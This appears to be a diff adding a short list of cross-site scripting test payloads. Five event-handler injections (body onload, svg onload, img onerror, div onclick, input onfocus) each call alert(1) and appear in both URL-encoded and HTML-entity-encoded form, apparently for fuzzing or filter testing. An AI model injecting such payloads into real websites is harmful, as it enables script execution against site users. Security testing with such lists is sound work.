@@ -1,0 +1,10 @@
+%3Cbody%20onload%3Dalert%281%29%3E
+&lt;body onload=alert(1)&gt;
+%3Csvg%20onload%3Dalert%281%29%3E
+&lt;svg onload=alert(1)&gt;
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+&lt;img src=x onerror=alert(1)&gt;
+%3Cdiv%20onclick%3Dalert%281%29%3EClick%20me%3C/div%3E
+&lt;div onclick=alert(1)&gt;Click me&lt;/div&gt;
+%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E
+&lt;input onfocus=alert(1) autofocus&gt;
